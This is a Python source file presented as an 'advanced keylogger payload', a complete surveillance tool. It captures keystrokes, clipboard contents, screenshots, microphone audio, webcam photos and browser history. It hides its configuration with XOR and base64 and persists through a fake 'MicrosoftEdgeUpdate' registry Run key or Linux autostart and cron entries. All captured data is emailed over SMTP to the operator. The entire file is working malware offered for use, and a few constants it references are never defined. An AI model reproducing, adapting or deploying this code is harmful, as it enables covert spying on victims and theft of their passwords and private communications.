#!/usr/bin/env python3
"""
🔑 ADVANCED KEYLOGGER PAYLOAD
Full surveillance suite with persistence, encryption, and stealth
"""

import os
import sys
import shutil
import subprocess
import smtplib
import socket
import platform
import threading
import time
import base64
import io
import sqlite3
import json
import tempfile
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders

import psutil
import pyperclip
import mss
import mss.tools

from pynput.keyboard import Key, Listener

# ==================== OBFUSCATED CONFIG ====================
_ENC_KEY = 0x5A
def _xd(d):
    """Decode XOR+b64"""
    return ''.join(chr(b ^ _ENC_KEY) for b in base64.b64decode(d))

# Obfuscated strings - replace these with your XOR'd values
# To obfuscate: base64.b64encode(bytes([ord(c)^0x5A for c in "smtp.gmail.com"])).decode()
SMTP_HOST = _xd("")        # smtp.gmail.com encoded
SMTP_PORT = 587
SENDER = _xd("")           # your email encoded
PASSWORD = _xd("")         # app password encoded
RECIPIENT = _xd("")        # recipient encoded

REPORT_INTERVAL = 60
SCREENSHOT_INTERVAL = 300
CLIPBOARD_INTERVAL = 10

class Keylogger:
    def __init__(self):
        self.keys = []
        self.clipboard_data = []
        self.screenshots = []
        self.lock = threading.Lock()
        self.running = True
        self.start_time = datetime.now()
        self.last_clipboard = ""
        self.tmp_dir = tempfile.mkdtemp()

    # ============ PERSISTENCE ============
    def setup_persistence(self):
        """Copy to AppData/Startup and create registry key (Windows) or cron (Linux)."""
        try:
            os_type = platform.system()
            if os_type == "Windows":
                appdata = os.environ['APPDATA']
                persist_dir = os.path.join(appdata, "Microsoft", "EdgeCore")
                os.makedirs(persist_dir, exist_ok=True)
                location = os.path.join(persist_dir, "MicrosoftEdgeUpdate.exe")
                if not os.path.exists(location):
                    shutil.copyfile(sys.executable if getattr(sys, 'frozen', False) else __file__, location)
                # HKCU Run key (no admin needed)
                subprocess.call(
                    f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                    f'/v "MicrosoftEdgeUpdate" /t REG_SZ /d "{location}" /f',
                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            elif os_type == "Linux":
                autostart_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(autostart_dir, exist_ok=True)
                location = os.path.join(autostart_dir, "system-update")
                if not os.path.exists(location):
                    shutil.copyfile(sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__), location)
                    os.chmod(location, 0o755)
                # Desktop entry (GUI autostart)
                entry = os.path.join(autostart_dir, "system-update.desktop")
                with open(entry, "w") as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Exec={location}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Update
""")
                # Cron fallback
                os.system(f'(crontab -l 2>/dev/null; echo "@reboot {location}") | crontab -')
        except Exception as e:
            pass

    # ============ SYSTEM INFO ============
    def get_system_info(self):
        info = {
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
            'os': platform.system(),
            'os_ver': platform.version(),
            'arch': platform.architecture()[0],
            'cpu': platform.processor(),
            'uptime': str(datetime.now() - self.start_time).split('.')[0],
        }
        try:
            info['cpu_pct'] = psutil.cpu_percent(interval=0.1)
            info['mem_pct'] = psutil.virtual_memory().percent
        except:
            info['cpu_pct'] = 'N/A'
            info['mem_pct'] = 'N/A'
        return info

    # ============ KEY CAPTURE ============
    def on_press(self, key):
        """Capture every keystroke including special keys."""
        with self.lock:
            try:
                if key == Key.space:
                    self.keys.append(' ')
                elif key == Key.enter:
                    self.keys.append('[ENTER]\n')
                elif key == Key.tab:
                    self.keys.append('[TAB]')
                elif key == Key.backspace:
                    self.keys.append('[BKSP]')
                elif key in (Key.shift_l, Key.shift_r):
                    self.keys.append('[SHIFT]')
                elif key in (Key.ctrl_l, Key.ctrl_r):
                    self.keys.append('[CTRL]')
                elif key in (Key.alt_l, Key.alt_r, Key.alt_gr):
                    self.keys.append('[ALT]')
                elif key == Key.caps_lock:
                    self.keys.append('[CAPS]')
                elif key == Key.esc:
                    self.keys.append('[ESC]')
                elif isinstance(key, Key):
                    self.keys.append(f'[{key.name.upper()}]')
                elif hasattr(key, 'char') and key.char:
                    self.keys.append(key.char)
            except Exception:
                pass

    # ============ CLIPBOARD MONITOR ============
    def clipboard_monitor(self):
        """Poll clipboard for new content."""
        while self.running:
            time.sleep(CLIPBOARD_INTERVAL)
            try:
                clip = pyperclip.paste()
                if clip and clip != self.last_clipboard and len(clip) < 10000:
                    with self.lock:
                        ts = datetime.now().strftime('%H:%M:%S')
                        self.clipboard_data.append(
                            f"═══ CLIPBOARD [{ts}] ═══\n{clip}\n"
                        )
                    self.last_clipboard = clip
            except Exception:
                pass

    # ============ SCREENSHOT CAPTURE ============
    def screenshot_capture(self):
        """Periodic screenshots using mss (fastest, cross-platform)."""
        while self.running:
            time.sleep(SCREENSHOT_INTERVAL)
            try:
                with mss.MSS() as sct:
                    # Grab all monitors
                    shot = sct.grab(sct.monitors[0])
                    png_data = mss.tools.to_png(shot.rgb, shot.size)
                    with self.lock:
                        self.screenshots.append({
                            'ts': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            'data': base64.b64encode(png_data).decode()
                        })
            except Exception:
                pass

    # ============ MICROPHONE RECORDING ============
    def mic_record(self):
        """Record short audio clips."""
        try:
            import sounddevice as sd
            from scipy.io.wavfile import write as wav_write
            import numpy as np
            fs = 44100
            while self.running:
                time.sleep(MIC_RECORD_DURATION * 3)
                try:
                    recording = sd.rec(int(MIC_RECORD_DURATION * fs),
                                       samplerate=fs, channels=1, dtype='int16')
                    sd.wait()
                    path = os.path.join(self.tmp_dir, f"mic_{int(time.time())}.wav")
                    wav_write(path, fs, recording)
                    self._exfil_file(path, "audio/wav", ".wav")
                    os.remove(path)
                except Exception:
                    pass
        except ImportError:
            pass

    # ============ WEBCAM CAPTURE ============
    def webcam_capture(self):
        """Take periodic webcam photos."""
        try:
            import cv2
            while self.running:
                time.sleep(WEBCAM_INTERVAL)
                try:
                    cam = cv2.VideoCapture(0)
                    ret, frame = cam.read()
                    if ret:
                        path = os.path.join(self.tmp_dir, f"cam_{int(time.time())}.jpg")
                        cv2.imwrite(path, frame)
                        self._exfil_file(path, "image/jpeg", ".jpg")
                        os.remove(path)
                    cam.release()
                except Exception:
                    pass
        except ImportError:
            pass

    # ============ BROWSER HISTORY ============
    def get_browser_history(self):
        """Extract Chrome/Edge history."""
        hist = []
        try:
            user = os.path.expanduser("~")
            browsers = [
                ("Chrome", os.path.join(user, "AppData/Local/Google/Chrome/User Data/Default/History")),
                ("Edge", os.path.join(user, "AppData/Local/Microsoft/Edge/User Data/Default/History")),
            ]
            for name, path in browsers:
                if os.path.exists(path):
                    tmp = os.path.join(self.tmp_dir, "hist_copy")
                    shutil.copyfile(path, tmp)
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                    rows = cur.fetchall()
                    hist.append(f"═══ {name} History (Top 50) ═══")
                    for url, title, cnt in rows:
                        hist.append(f"[{cnt}x] {title[:60]} → {url[:100]}")
                    conn.close()
                    os.remove(tmp)
        except Exception:
            pass
        return '\n'.join(hist)

    # ============ FILE EXFILTRATION ============
    def _exfil_file(self, filepath, mime_type, ext):
        """Send a single file as email attachment."""
        try:
            msg = MIMEMultipart()
            msg['From'] = SENDER
            msg['To'] = RECIPIENT
            msg['Subject'] = f"📎 {os.path.basename(filepath)} - {socket.gethostname()}"
            
            with open(filepath, 'rb') as f:
                part = MIMEBase(mime_type.split('/')[0], mime_type.split('/')[1])
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(filepath)}"')
                msg.attach(part)
            
            server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=15)
            server.starttls()
            server.login(SENDER, PASSWORD)
            server.send_message(msg)
            server.quit()
        except Exception:
            pass

    # ============ MAIN REPORT ============
    def send_report(self):
        """Compile and send all captured data via email."""
        while self.running:
            time.sleep(REPORT_INTERVAL)
            
            with self.lock:
                keys_msg = ''.join(self.keys) if self.keys else "No keystrokes this interval"
                self.keys.clear()
                clip_msg = ''.join(self.clipboard_data) if self.clipboard_data else "No clipboard activity"
                self.clipboard_data.clear()
                shots = self.screenshots[:]
                self.screenshots.clear()
            
            sys_info = self.get_system_info()
            history = self.get_browser_history()
            
            msg = MIMEMultipart()
            msg['From'] = SENDER
            msg['To'] = RECIPIENT
            msg['Subject'] = f"📊 Report - {sys_info['hostname']} - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            
            body = f"""
═══════════════════════════════════════════════
   SYSTEM SURVEILLANCE REPORT
═══════════════════════════════════════════════
 Timestamp:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 Hostname:     {sys_info['hostname']}
 IP Address:   {sys_info['ip']}
 Username:     {sys_info['user']}
 OS:           {sys_info['os']} {sys_info['os_ver']}
 Architecture: {sys_info['arch']}
 CPU Usage:    {sys_info['cpu_pct']}%
 Memory Usage: {sys_info['mem_pct']}%
 Uptime:       {sys_info['uptime']}
═══════════════════════════════════════════════
 KEYSTROKES
═══════════════════════════════════════════════
{keys_msg}

═══════════════════════════════════════════════
 CLIPBOARD
═══════════════════════════════════════════════
{clip_msg}

═══════════════════════════════════════════════
 BROWSER HISTORY
═══════════════════════════════════════════════
{history if history else "No browser history accessible"}

═══════════════════════════════════════════════
 Screenshots: {len(shots)}
═══════════════════════════════════════════════
"""
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach screenshots
            for shot in shots:
                try:
                    img_data = base64.b64decode(shot['data'])
                    img = MIMEImage(img_data)
                    fname = f"shot_{shot['ts'].replace(':', '-').replace(' ', '_')}.png"
                    img.add_header('Content-Disposition', f'attachment; filename="{fname}"')
                    msg.attach(img)
                except Exception:
                    pass
            
            try:
                server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=15)
                server.starttls()
                server.login(SENDER, PASSWORD)
                server.send_message(msg)
                server.quit()
            except Exception:
                pass

    # ============ START ============
    def start(self):
        self.setup_persistence()
        
        threads = [
            threading.Thread(target=self.send_report, daemon=True),
            threading.Thread(target=self.clipboard_monitor, daemon=True),
            threading.Thread(target=self.screenshot_capture, daemon=True),
            threading.Thread(target=self.mic_record, daemon=True),
            threading.Thread(target=self.webcam_capture, daemon=True),
        ]
        for t in threads:
            t.start()
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    try:
        Keylogger().start()
    except KeyboardInterrupt:
        pass
